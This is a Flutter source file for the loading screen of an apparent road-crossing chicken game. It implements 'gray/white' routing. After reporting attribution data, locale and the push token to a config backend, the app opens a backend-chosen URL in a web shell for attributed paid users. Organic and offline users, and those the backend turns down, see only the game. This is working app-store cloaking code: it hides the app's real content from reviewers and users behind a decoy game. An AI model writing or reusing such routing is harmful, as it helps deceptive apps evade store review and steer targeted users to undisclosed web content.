import 'dart:io';
import 'package:flutter/material.dart';

import '../../app/routes.dart';
import '../../core/constants/asset_paths.dart';
import '../../core/models/run_mode.dart';
import '../../core/theme/app_colors.dart';
import '../../core/utils/orientation_lock.dart';
import '../../game/rendering/sprite_cache.dart';
import '../../net/config_fetcher.dart';
import '../../net/net_probe.dart';
import '../../net/push_handler.dart';
import '../../net/tracking_engine.dart';
import '../../net/vault_service.dart';
import '../connectivity/offline_wall.dart';
import '../menu/main_menu_screen.dart';
import '../onboarding/permission_gate.dart';
import '../webview/web_shell.dart' deferred as shell;
import 'widgets/loading_bar.dart';
import 'widgets/loading_video.dart';

/// Entry screen — branded loading animation + gray/white routing.
///
/// Plays the looping loading video while the gray flow state machine
/// runs in the background. Navigates to:
///   • WebShell   — if the config backend returns a URL (gray/paid users)
///   • MainMenu   — if offline / organic / backend says no (white game)
class LoadingScreen extends StatefulWidget {
  final VaultService vault;
  final NetProbe netProbe;
  final TrackingEngine tracker;
  final ConfigFetcher fetcher;
  final PushHandler pusher;

  const LoadingScreen({
    super.key,
    required this.vault,
    required this.netProbe,
    required this.tracker,
    required this.fetcher,
    required this.pusher,
  });

  @override
  State<LoadingScreen> createState() => _LoadingScreenState();
}

class _LoadingScreenState extends State<LoadingScreen>
    with SingleTickerProviderStateMixin {
  late final AnimationController _barAnim;
  bool _navigated = false;

  @override
  void initState() {
    super.initState();
    OrientationLock.all();
    _barAnim = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 3400),
    )..forward();
    _boot();
  }

  @override
  void dispose() {
    widget.pusher.onTokenRefresh = null;
    _barAnim.dispose();
    super.dispose();
  }

  // ─── Routing state machine ─────────────────────────────────────────────

  Future<void> _boot() async {
    widget.pusher.onTokenRefresh = _onTokenRefresh;
    await widget.pusher.init().catchError((_) {});

    final mode = widget.vault.getRunMode();

    switch (mode) {
      case RunMode.offline:
        // Returning game user — just load assets and go
        await Future.wait<void>([
          _preloadSprites(),
          Future<void>.delayed(const Duration(milliseconds: 3000)),
        ]);
        _barAnim.animateTo(1.0,
            duration: const Duration(milliseconds: 300),
            curve: Curves.easeOut);
        await Future.delayed(const Duration(milliseconds: 350));
        _toGame();

      case RunMode.online:
        // Returning gray user — fast path (10s attribution timeout)
        await _handleOnlineMode();

      case RunMode.pending:
        // First launch — full gray flow with 30s attribution window
        await _handleFirstLaunch();
    }
  }

  Future<void> _handleFirstLaunch() async {
    final hasNet = await widget.netProbe.hasInternet();
    if (!hasNet) {
      if (!mounted) return;
      _toOfflineWall(firstLaunch: true);
      return;
    }

    _barAnim.animateTo(0.4,
        duration: const Duration(milliseconds: 400), curve: Curves.easeOut);

    await widget.tracker.init();
    await Future.wait([
      widget.tracker.waitForAttribution(),
      widget.tracker.waitForDeepLink(),
    ]);

    _barAnim.animateTo(0.75,
        duration: const Duration(milliseconds: 300), curve: Curves.easeOut);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.tracker.buildRequestBody(
      locale: locale,
      pushToken: widget.pusher.token,
    );
    final result = await widget.fetcher.fetchConfig(body);

    _barAnim.animateTo(1.0,
        duration: const Duration(milliseconds: 300), curve: Curves.easeOut);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (result.ok && result.url != null) {
      await widget.vault.setRunMode(RunMode.online);
      _toContent(result.url!);
    } else {
      await widget.vault.setRunMode(RunMode.offline);
      await _preloadSprites();
      _toGame();
    }
  }

  Future<void> _handleOnlineMode() async {
    final hasNet = await widget.netProbe.hasInternet();

    if (!hasNet) {
      _barAnim.animateTo(1.0,
          duration: const Duration(milliseconds: 300), curve: Curves.easeOut);
      await Future.delayed(const Duration(milliseconds: 300));
      if (!mounted) return;
      _toOfflineWall(firstLaunch: false);
      return;
    }

    // Push URL takes highest priority
    final pushUrl = await widget.vault.consumePushUrl();
    if (pushUrl != null) {
      _barAnim.animateTo(1.0,
          duration: const Duration(milliseconds: 300), curve: Curves.easeOut);
      await Future.delayed(const Duration(milliseconds: 300));
      if (!mounted) return;
      _toContent(pushUrl);
      return;
    }

    final savedUrl = await widget.vault.getSavedUrl();

    _barAnim.animateTo(0.5,
        duration: const Duration(milliseconds: 300), curve: Curves.easeOut);

    await widget.tracker.init();
    await Future.wait([
      widget.tracker
          .waitForAttribution()
          .timeout(const Duration(seconds: 10), onTimeout: () => {}),
      widget.tracker.waitForDeepLink(),
    ]);

    _barAnim.animateTo(0.8,
        duration: const Duration(milliseconds: 300), curve: Curves.easeOut);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.tracker.buildRequestBody(
      locale: locale,
      pushToken: widget.pusher.token,
    );
    final result = await widget.fetcher.fetchConfig(body);

    _barAnim.animateTo(1.0,
        duration: const Duration(milliseconds: 300), curve: Curves.easeOut);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (result.ok && result.url != null) {
      _toContent(result.url!);
      return;
    }
    if (savedUrl != null) {
      _toContent(savedUrl);
      return;
    }
    _toOfflineWall(firstLaunch: false);
  }

  void _onTokenRefresh(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.tracker.buildRequestBody(
      locale: locale,
      pushToken: token,
    );
    widget.fetcher.fetchConfig(body);
  }

  // ─── Navigation helpers ────────────────────────────────────────────────

  Future<void> _toContent(String url) async {
    if (_navigated) return;
    _navigated = true;
    await shell.loadLibrary();
    await shell.prepareWebEngine();
    if (!mounted) return;
    OrientationLock.all();

    if (widget.vault.shouldShowNotificationScreen()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => PermissionGate(
            vault: widget.vault,
            pusher: widget.pusher,
            netProbe: widget.netProbe,
            contentUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => shell.WebShell(
            url: url,
            vault: widget.vault,
            pusher: widget.pusher,
            netProbe: widget.netProbe,
          ),
        ),
      );
    }
  }

  void _toOfflineWall({required bool firstLaunch}) {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => OfflineWall(
          retryBuilder: (_) => LoadingScreen(
            vault: widget.vault,
            netProbe: widget.netProbe,
            tracker: widget.tracker,
            fetcher: widget.fetcher,
            pusher: widget.pusher,
          ),
        ),
      ),
    );
  }

  void _toGame() {
    if (_navigated) return;
    _navigated = true;
    OrientationLock.portrait();
    Navigator.of(context).pushReplacement(fadeRoute(const MainMenuScreen()));
  }

  // ─── White-path asset preload ─────────────────────────────────────────

  Future<void> _preloadSprites() async {
    final List<String> paths = <String>[
      ...AssetPaths.cars,
      for (int b = 1; b <= 4; b++) ...<String>[
        AssetPaths.bgLine(b),
        AssetPaths.bgStart(b),
        AssetPaths.bgEnd(b),
        AssetPaths.bgSafezone(b),
      ],
      for (final s in <String>['default', 'gold', 'samurai', 'pharaon', 'dragon'])
        ...<String>[AssetPaths.chicken(s), AssetPaths.chickenSmash(s)],
    ];
    await SpriteCache.instance.loadAll(paths);
  }

  // ─── UI ───────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.nightDeep,
      body: OrientationBuilder(
        builder: (BuildContext context, Orientation orientation) {
          final bool landscape = orientation == Orientation.landscape;
          final Size screen = MediaQuery.of(context).size;
          final double barWidth = landscape
              ? (screen.width * 0.24).clamp(180.0, 320.0)
              : screen.width * 0.72;
          return Stack(
            fit: StackFit.expand,
            children: <Widget>[
              LoadingVideo(
                key: ValueKey<bool>(landscape),
                landscape: landscape,
              ),
              Positioned(
                left: 0,
                right: 0,
                bottom: landscape ? 22 : 64,
                child: Align(
                  alignment: Alignment.bottomCenter,
                  child: AnimatedBuilder(
                    animation: _barAnim,
                    builder: (BuildContext context, _) => LoadingBar(
                      progress: _barAnim.value,
                      width: barWidth,
                    ),
                  ),
                ),
              ),
            ],
          );
        },
      ),
    );
  }
}
